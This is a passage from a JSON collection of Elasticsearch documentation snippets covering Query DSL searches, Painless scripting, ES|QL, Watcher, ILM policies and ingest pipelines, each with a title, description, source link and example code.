[
  {
    "owner": "elastic",
    "repo": "elasticsearch",
    "content": "TITLE: Using Lambda Expressions and Method References in Painless\nDESCRIPTION: This code demonstrates various ways to use lambda expressions and method references in Painless scripting. Examples include removing elements from a list based on a condition, sorting list elements, and using the Integer.compare method reference for comparison operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-lambdas.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nlist.removeIf(item -> item == 2);\nlist.removeIf((int item) -> item == 2);\nlist.removeIf((int item) -> { item == 2 });\nlist.sort((x, y) -> x - y);\nlist.sort(Integer::compare);\n```\n\n----------------------------------------\n\nTITLE: Registering a Gradle Task Using Avoidance API\nDESCRIPTION: Example of using Gradle's task avoidance API to register a task lazily rather than creating it eagerly. This improves build configuration time by only executing configuration blocks when required.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/BUILDING.md#2025-04-21_snippet_2\n\nLANGUAGE: groovy\nCODE:\n```\ntasks.register('someTask') { ... }\n```\n\n----------------------------------------\n\nTITLE: Setting Up Rollover Policy with Phase Transition Control in Elasticsearch\nDESCRIPTION: This example creates an ILM policy that deletes an index one day after it rolls over, not one day after creation. It demonstrates how rollover conditions block phase transitions until the rollover succeeds, which happens when the index reaches 50GB.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-rollover.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPUT /_ilm/policy/rollover_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"actions\": {\n          \"rollover\": {\n            \"max_size\": \"50gb\"\n          }\n        }\n      },\n      \"delete\": {\n        \"min_age\": \"1d\",\n        \"actions\": {\n          \"delete\": {}\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing a Basic Match Query\nDESCRIPTION: This snippet demonstrates how to perform a basic match query to find documents that contain the phrase 'this is a test' in the 'message' field. It is useful for full-text search functionalities in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match\": {\n      \"message\": {\n        \"query\": \"this is a test\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Boolean Query Example in Elasticsearch\nDESCRIPTION: This code snippet demonstrates a basic boolean query in Elasticsearch. It combines `must`, `filter`, `must_not`, and `should` clauses to filter and score documents based on multiple criteria. The `minimum_should_match` parameter specifies the minimum number of `should` clauses that must match.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-bool-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _search\n{\n  \"query\": {\n    \"bool\" : {\n      \"must\" : {\n        \"term\" : { \"user.id\" : \"kimchy\" }\n      },\n      \"filter\": {\n        \"term\" : { \"tags\" : \"production\" }\n      },\n      \"must_not\" : {\n        \"range\" : {\n          \"age\" : { \"gte\" : 10, \"lte\" : 20 }\n        }\n      },\n      \"should\" : [\n        { \"term\" : { \"tags\" : \"env1\" } },\n        { \"term\" : { \"tags\" : \"deployed\" } }\n      ],\n      \"minimum_should_match\" : 1,\n      \"boost\" : 1.0\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Watcher with Comprehensive Scripting\nDESCRIPTION: This example demonstrates a complete watch configuration, including a scripted condition, transform, and action-specific transforms.  The example shows how to use the `ctx.metadata` to externalize configuration. It also shows how to use a scripted condition within the watch definition. The aggregation also uses a script to calculate the `cost`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-transform-context.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST _watcher/watch/_execute\n{\n  \"watch\" : {\n    \"metadata\" : { \"high_threshold\": 4000, \"low_threshold\": 1000 },\n    \"trigger\" : { \"schedule\" : { \"interval\" : \"24h\" } },\n    \"input\" : {\n      \"search\" : {\n        \"request\" : {\n          \"indices\" : [ \"seats\" ],\n          \"body\" : {\n            \"query\" : {\n              \"term\": { \"sold\": \"true\"}\n            },\n            \"aggs\" : {\n              \"theatres\" : {\n                \"terms\" : { \"field\" : \"play\" },\n                \"aggs\" : {\n                  \"money\" : {\n                    \"sum\": {\n                      \"field\" : \"cost\",\n                      \"script\": {\n                       \"source\": \"doc.cost.value * doc.number.value\"\n                      }\n                    }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    },\n    \"condition\" : {\n      \"script\" :\n      \"\"\"\n        return ctx.payload.aggregations.theatres.buckets.stream()\n          .anyMatch(theatre -> theatre.money.value < ctx.metadata.low_threshold ||\n                               theatre.money.value > ctx.metadata.high_threshold)\n      \"\"\"\n    },\n    \"transform\" : {\n      \"script\":\n      \"\"\"\n        return [\n          'money_makers': ctx.payload.aggregations.theatres.buckets.stream()\n            .filter(t -> {\n                return t.money.value > ctx.metadata.high_threshold\n            })\n            .map(t -> {\n                return ['play': t.key, 'total_value': t.money.value ]\n            }).collect(Collectors.toList()),\n          'duds' : ctx.payload.aggregations.theatres.buckets.stream()\n            .filter(t -> {\n                return t.money.value < ctx.metadata.low_threshold\n            })\n            .map(t -> {\n                return ['play': t.key, 'total_value': t.money.value ]\n            }).collect(Collectors.toList())\n          ]\n      \"\"\"\n    },\n    \"actions\" : {\n      \"log_money_makers\" : {\n        \"condition\": {\n          \"script\" : \"return ctx.payload.money_makers.size() > 0\"\n        },\n        \"transform\": {\n          \"script\" :\n          \"\"\"\n          def formatter = NumberFormat.getCurrencyInstance();\n          return [\n            'plays_value': ctx.payload.money_makers.stream()\n              .map(t-> formatter.format(t.total_value) + ' for the play ' + t.play)\n              .collect(Collectors.joining(\", \"))\n          ]\n          \"\"\"\n        },\n        \"logging\" : {\n          \"text\" : \"The following plays contain the highest grossing total income: {{ctx.payload.plays_value}}\"\n        }\n      },\n      \"log_duds\" : {\n        \"condition\": {\n          \"script\" : \"return ctx.payload.duds.size() > 0\"\n        },\n        \"transform\": {\n          \"script\" :\n          \"\"\"\n          def formatter = NumberFormat.getCurrencyInstance();\n          return [\n            'plays_value': ctx.payload.duds.stream()\n              .map(t-> formatter.format(t.total_value) + ' for the play ' + t.play)\n              .collect(Collectors.joining(\", \"))\n          ]\n          \"\"\"\n        },\n        \"logging\" : {\n          \"text\" : \"The following plays need more advertising due to their low total income: {{ctx.payload.plays_value}}\"\n        }\n      }\n    }\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Subsequent Search Request with search_after Parameter in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the search_after parameter to retrieve the next page of results. The sort values from the last hit of the previous page are used as the search_after value to continue pagination.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET twitter/_search\n{\n    \"query\": {\n        \"match\": {\n            \"title\": \"elasticsearch\"\n        }\n    },\n    \"search_after\": [1463538857, \"654323\"],\n    \"sort\": [\n        {\"date\": \"asc\"},\n        {\"tie_breaker_id\": \"asc\"}\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Elasticsearch Cluster Name in YAML\nDESCRIPTION: Sets the cluster name, which is used to identify and group nodes. All nodes in a cluster must share the same name. The default is 'elasticsearch', but it should be changed to something descriptive.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/miscellaneous-cluster-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.name: logging-prod\n```\n\n----------------------------------------\n\nTITLE: Querying All Documents with match_all in Elasticsearch\nDESCRIPTION: This code snippet demonstrates how to perform a match_all query in Elasticsearch, which retrieves all documents with a default score of 1.0. It showcases the basic structure of an Elasticsearch query using the '_search' endpoint.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-all-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n    \"query\": {\n        \"match_all\": {}\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Arctangent using ATAN() in ESQL\nDESCRIPTION: Example showing how to compute the arctangent of a numeric value using the ATAN function. The query creates a row with a value of 12.9 and calculates its arctangent, resulting in approximately 1.4934316673669235 radians.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/atan.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=12.9\n| EVAL atan=ATAN(a)\n```\n\n----------------------------------------\n\nTITLE: Accessing Geopoint Values in Painless Scripts\nDESCRIPTION: Examples showing how to access geopoint values in Painless scripts, including both object-based and direct access methods for latitude and longitude values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-point.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\ndef geopoint = doc['location'].value;\ndef lat      = geopoint.lat;\ndef lon      = geopoint.lon;\n```\n\nLANGUAGE: painless\nCODE:\n```\ndef lat      = doc['location'].lat;\ndef lon      = doc['location'].lon;\n```\n\n----------------------------------------\n\nTITLE: Performing kNN Search in Elasticsearch\nDESCRIPTION: Executes a kNN search query to find the nearest vectors within an indexed dataset in Elasticsearch. Key parameters include the 'field' for search, 'query_vector' for matching, and 'k', the number nearest neighbors per shard. The function combines shard results for top global matches, and outputs the query results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-knn-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST my-image-index/_search\n{\n  \"size\" : 3,\n  \"query\" : {\n    \"knn\": {\n      \"field\": \"image-vector\",\n      \"query_vector\": [-5, 9, -12],\n      \"k\": 10\n    }\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Logarithm Function in Rank Feature Query\nDESCRIPTION: This snippet illustrates the implementation of the log function within a rank_feature query in Elasticsearch to adjust relevance scores. It applies the function to the pagerank field with a scaling factor, and supports only rank features with a positive score impact, requiring a proper index setup.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-rank-feature-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /test/_search\n{\n  \"query\": {\n    \"rank_feature\": {\n      \"field\": \"pagerank\",\n      \"log\": {\n        \"scaling_factor\": 4\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Watch Condition with Aggregation Stream Processing\nDESCRIPTION: Example of a watch configuration that uses Painless script to monitor theater revenue. The condition script uses Java Stream API to filter aggregation results and triggers when theaters have revenue outside the normal range (below $15000 or above $50000).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-condition-context.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPOST _watcher/watch/_execute\n{\n  \"watch\" : {\n    \"trigger\" : { \"schedule\" : { \"interval\" : \"24h\" } },\n    \"input\" : {\n      \"search\" : {\n        \"request\" : {\n          \"indices\" : [ \"seats\" ],\n          \"body\" : {\n            \"query\" : {\n              \"term\": { \"sold\": \"true\"}\n            },\n            \"aggs\" : {\n              \"theatres\" : {\n                \"terms\" : { \"field\" : \"play\" },\n                \"aggs\" : {\n                  \"money\" : {\n                    \"sum\": { \"field\" : \"cost\" }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    },\n    \"condition\" : {\n      \"script\" :\n      \"\"\"\n        return ctx.payload.aggregations.theatres.buckets.stream()       \n          .filter(theatre -> theatre.money.value < 15000 ||\n                             theatre.money.value > 50000)               \n          .count() > 0                                                  \n      \"\"\"\n    },\n    \"actions\" : {\n      \"my_log\" : {\n        \"logging\" : {\n          \"text\" : \"The output of the search was : {{ctx.payload.aggregations.theatres.buckets}}\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Range Query Example\nDESCRIPTION: This example demonstrates a basic range query in Elasticsearch. It searches for documents where the 'age' field contains a value between 10 and 20, and boosts the relevance score of matching documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-range-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"range\": {\n      \"age\": {\n        \"gte\": 10,\n        \"lte\": 20,\n        \"boost\": 2.0\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Field Value Factor Query Example\nDESCRIPTION: Example of using field_value_factor function to influence document scores based on a numeric field value, with options for factor multiplication and value modification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"function_score\": {\n      \"field_value_factor\": {\n        \"field\": \"my-int\",\n        \"factor\": 1.2,\n        \"modifier\": \"sqrt\",\n        \"missing\": 1\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Hybrid Search Combining kNN and Lexical Queries in Elasticsearch\nDESCRIPTION: Combines kNN and lexical queries to create a hybrid search strategy in Elasticsearch. This example demonstrates using `knn` and `match` queries in a `bool` query, allowing simultaneous vector and text-based search criteria. Dependencies include configured mappings for both vector and text data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-knn-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST my-image-index/_search\n{\n  \"size\" : 3,\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        {\n          \"match\": {\n            \"title\": {\n              \"query\": \"mountain lake\",\n              \"boost\": 1\n            }\n          }\n        },\n        {\n          \"knn\": {\n            \"field\": \"image-vector\",\n            \"query_vector\": [-5, 9, -12],\n            \"k\": 10,\n            \"boost\": 2\n          }\n        }\n      ]\n    }\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Performing Fuzzy Matching in Query\nDESCRIPTION: This snippet demonstrates how to add fuzziness to a match query, allowing for approximate matches in the search results. It is particularly useful for handling misspellings or variations in text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match\": {\n      \"message\": {\n        \"query\": \"this is a testt\",\n        \"fuzziness\": \"AUTO\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch Data with LOOKUP JOIN in ESQL\nDESCRIPTION: This ESQL query uses the LOOKUP JOIN command to enrich network firewall log events from the 'firewall_logs' index by joining with threat intelligence data from the 'threat_list' lookup index on the 'source.ip' field. It filters results to only those with non-null threat levels, sorts results by timestamp (since LOOKUP JOIN does not guarantee order), selects specific output columns, and limits the output to 10 rows. The query forces left-join behavior where unmatched rows retain null values in enriched fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-lookup-join.md#_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM firewall_logs # The source index\n| LOOKUP JOIN threat_list ON source.ip # The lookup index and join field\n| WHERE threat_level IS NOT NULL # Filter for rows non-null threat levels\n| SORT timestamp # LOOKUP JOIN does not guarantee output order, so you must explicitly sort the results if needed\n| KEEP timestamp, source.ip, destination.ip, action, threat_level, threat_type # Keep only relevant fields\n| LIMIT 10 # Limit the output to 10 rows\n```\n\n----------------------------------------\n\nTITLE: Reciprocal Rank Fusion with Semantic Search\nDESCRIPTION: Shows how to use Reciprocal Rank Fusion (RRF) to combine standard term queries with semantic queries for improved result ranking\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-semantic-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my-index/_search\n{\n  \"retriever\": {\n    \"rrf\": {\n      \"retrievers\": [\n        {\n          \"standard\": {\n            \"query\": {\n              \"term\": {\n                \"text\": \"shoes\"\n              }\n            }\n          }\n        },\n        {\n          \"standard\": {\n            \"query\": {\n              \"semantic\": {\n                \"field\": \"semantic_field\",\n                \"query\": \"shoes\"\n              }\n            }\n          }\n        }\n      ],\n      \"rank_window_size\": 50,\n      \"rank_constant\": 20\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Fuzzy Searching Book Titles using QSTR in ESQL\nDESCRIPTION: This ESQL query performs a fuzzy search for book titles similar to 'Hobbit'. It uses the QSTR function with a fuzziness parameter of 2, allowing for slight variations in spelling or typos.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/qstr.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE QSTR(\"title: Hobbjt~\", {\"fuzziness\": 2})\n```\n\n----------------------------------------\n\nTITLE: Using COUNT Function in Elasticsearch SQL\nDESCRIPTION: The COUNT function returns the total number of input values. When used with a wildcard (*) or literal, all values are considered including null or missing ones. With a field name, null values are not counted.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nCOUNT(expression) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT COUNT(*) AS count FROM emp;\n\n     count\n---------------\n100\n```\n\n----------------------------------------\n\nTITLE: Nested Boolean Query in Elasticsearch\nDESCRIPTION: This example shows how to nest boolean queries within each other in Elasticsearch. This allows for complex logical combinations of search conditions. The example demonstrates combining `must` and `should` clauses within nested `bool` queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-bool-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": [ <1>\n        {\n          \"bool\": {\n            \"should\": [\n              { \"match\": { \"user.id\": \"kimchy\" }},\n              { \"match\": { \"user.id\": \"banon\" }}\n            ]\n          }\n        },\n        { \"match\": { \"tags\": \"production\" }}\n      ],\n      \"should\": [ <2>\n        {\n          \"bool\": {\n            \"must\": [\n              { \"match\": { \"status\": \"active\" }},\n              { \"match\": { \"title\": \"quick brown fox\" }}\n            ]\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining and Using Rank Features Field in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to define a rank_features field in an Elasticsearch index mapping, insert documents with rank features, and perform queries using these features. It shows both positive and negative score impact features.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/rank-features.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"topics\": {\n        \"type\": \"rank_features\"\n      },\n      \"negative_reviews\" : {\n        \"type\": \"rank_features\",\n        \"positive_score_impact\": false\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"topics\": {\n    \"politics\": 20,\n    \"economics\": 50.8\n  },\n  \"negative_reviews\": {\n    \"1star\": 10,\n    \"2star\": 100\n  }\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"topics\": {\n    \"politics\": 5.2,\n    \"sports\": 80.1\n  },\n  \"negative_reviews\": {\n    \"1star\": 1,\n    \"2star\": 10\n  }\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"rank_feature\": {\n      \"field\": \"topics.politics\"\n    }\n  }\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"rank_feature\": {\n      \"field\": \"negative_reviews.1star\"\n    }\n  }\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"term\": {\n      \"topics\": \"economics\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Reimplementing smartcn Analyzer with Custom Configuration in Elasticsearch\nDESCRIPTION: This example demonstrates how to rebuild the smartcn analyzer as a custom analyzer with additional configuration. The rebuilt analyzer uses the smartcn_tokenizer and applies porter_stem and smartcn_stop filters, allowing for more flexible Chinese text analysis.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/_reimplementing_and_extending_the_analyzers.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT smartcn_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"rebuilt_smartcn\": {\n          \"tokenizer\":  \"smartcn_tokenizer\",\n          \"filter\": [\n            \"porter_stem\",\n            \"smartcn_stop\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Overriding Global Highlighting Settings in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to specify global highlighter settings and selectively override them for individual fields. It configures the number of fragments, fragment size, and custom tags for different fields in the search results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\" : {\n    \"match\": { \"user.id\": \"kimchy\" }\n  },\n  \"highlight\" : {\n    \"number_of_fragments\" : 3,\n    \"fragment_size\" : 150,\n    \"fields\" : {\n      \"body\" : { \"pre_tags\" : [\"<em>\"], \"post_tags\" : [\"</em>\"] },\n      \"blog.title\" : { \"number_of_fragments\" : 0 },\n      \"blog.author\" : { \"number_of_fragments\" : 0 },\n      \"blog.comment\" : { \"number_of_fragments\" : 5, \"order\" : \"score\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating a Document with Optimistic Concurrency Control in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to update a document while ensuring no other changes have been made since retrieval. It uses the if_seq_no and if_primary_term parameters to implement optimistic concurrency control.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/optimistic-concurrency-control.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT products/_doc/1567?if_seq_no=362&if_primary_term=2\n{\n  \"product\": \"r2d2\",\n  \"details\": \"A resourceful astromech droid\",\n  \"tags\": [ \"droid\" ]\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Advanced Fuzzy Search Elasticsearch Console\nDESCRIPTION: Illustrates an advanced fuzzy search query in Elasticsearch using extra parameters like 'fuzziness', 'max_expansions', 'prefix_length', 'transpositions', and 'rewrite' to control how similar terms are discovered. The search looks for terms similar to 'ki' in the user.id field with specified parameters for greater control over query execution and performance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-fuzzy-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"fuzzy\": {\n      \"user.id\": {\n        \"value\": \"ki\",\n        \"fuzziness\": \"AUTO\",\n        \"max_expansions\": 50,\n        \"prefix_length\": 0,\n        \"transpositions\": true,\n        \"rewrite\": \"constant_score_blended\"\n      }\n    }\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Performing Sum Aggregation on Sales Data in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the sum aggregation to calculate the total price of all hats in a sales index. It filters documents by type 'hat' and sums the 'price' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-sum-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"query\": {\n    \"constant_score\": {\n      \"filter\": {\n        \"match\": { \"type\": \"hat\" }\n      }\n    }\n  },\n  \"aggs\": {\n    \"hat_prices\": { \"sum\": { \"field\": \"price\" } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining STATS Command Syntax in ESQL\nDESCRIPTION: Specifies the syntax for the STATS command, including optional column naming, expressions, WHERE clauses, and BY grouping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nSTATS [column1 =] expression1 [WHERE boolean_expression1][,\n      ...,\n      [columnN =] expressionN [WHERE boolean_expressionN]]\n      [BY grouping_expression1[, ..., grouping_expressionN]]\n```\n\n----------------------------------------\n\nTITLE: Escaping Reserved Characters in query_string Query\nDESCRIPTION: Example of how to escape special characters in a query_string query. When using JSON for request body, two backslashes are required because backslash is a reserved escaping character in JSON strings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\" : {\n    \"query_string\" : {\n      \"query\" : \"kimchy\\\\!\",\n      \"fields\"  : [\"user.id\"]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Terms Lookup Query Example\nDESCRIPTION: Demonstrates using terms lookup to find documents with color values matching a specified document\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-terms-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search?pretty\n{\n  \"query\": {\n    \"terms\": {\n        \"color\" : {\n            \"index\" : \"my-index-000001\",\n            \"id\" : \"2\",\n            \"path\" : \"color\"\n        }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Aggregation Results Example\nDESCRIPTION: Sample output showing the results of the terms aggregation on termA field, displaying term counts for all matching documents regardless of rank_window_size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_17\n\nLANGUAGE: javascript\nCODE:\n```\n{\n    \"foo\": 3,\n    \"aardvark\": 1\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Query and Filter Contexts in Elasticsearch Search API\nDESCRIPTION: This example demonstrates how to use both query and filter contexts in an Elasticsearch search request. The query combines scored clauses (matching 'Search' in title and 'Elasticsearch' in content) with filter clauses (checking for 'published' status and dates after 2015-01-01) for efficient, relevant search results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-filter-context.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": { <1>\n    \"bool\": { <2>\n      \"must\": [\n        { \"match\": { \"title\":   \"Search\"        }},\n        { \"match\": { \"content\": \"Elasticsearch\" }}\n      ],\n      \"filter\": [ <3>\n        { \"term\":  { \"status\": \"published\" }},\n        { \"range\": { \"publish_date\": { \"gte\": \"2015-01-01\" }}}\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a GeoIP Pipeline with Country Database\nDESCRIPTION: Example of creating an ingest pipeline that uses the country database and specifies a custom target field for the geographical information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/geoip-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPUT _ingest/pipeline/geoip\n{\n  \"description\" : \"Add ip geolocation info\",\n  \"processors\" : [\n    {\n      \"geoip\" : {\n        \"field\" : \"ip\",\n        \"target_field\" : \"geo\",\n        \"database_file\" : \"GeoLite2-Country.mmdb\"\n      }\n    }\n  ]\n}\nPUT my-index-000001/_doc/my_id?pipeline=geoip\n{\n  \"ip\": \"89.160.20.128\"\n}\nGET my-index-000001/_doc/my_id\n```\n\n----------------------------------------\n\nTITLE: Using Redact Processor with IP Pattern\nDESCRIPTION: Example showing how to use the Redact processor to obscure an IP address in a message field using the built-in IP Grok pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/redact-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _ingest/pipeline/_simulate\n{\n  \"pipeline\": {\n    \"description\" : \"Hide my IP\",\n    \"processors\": [\n      {\n        \"redact\": {\n          \"field\": \"message\",\n          \"patterns\": [\"%{IP:client}\"]\n        }\n      }\n    ]\n  },\n  \"docs\":[\n    {\n      \"_source\": {\n        \"message\": \"55.3.244.1 GET /index.html 15824 0.043\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Analyzers for Phrase Queries in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to set up multiple analyzers in Elasticsearch to handle different analysis needs, including a special analyzer for phrase queries that preserves stop words. It includes index creation, mapping configuration, document indexing, and a sample search query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/analyzer.md#2025-04-22_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n   \"settings\":{\n      \"analysis\":{\n         \"analyzer\":{\n            \"my_analyzer\":{\n               \"type\":\"custom\",\n               \"tokenizer\":\"standard\",\n               \"filter\":[\n                  \"lowercase\"\n               ]\n            },\n            \"my_stop_analyzer\":{\n               \"type\":\"custom\",\n               \"tokenizer\":\"standard\",\n               \"filter\":[\n                  \"lowercase\",\n                  \"english_stop\"\n               ]\n            }\n         },\n         \"filter\":{\n            \"english_stop\":{\n               \"type\":\"stop\",\n               \"stopwords\":\"_english_\"\n            }\n         }\n      }\n   },\n   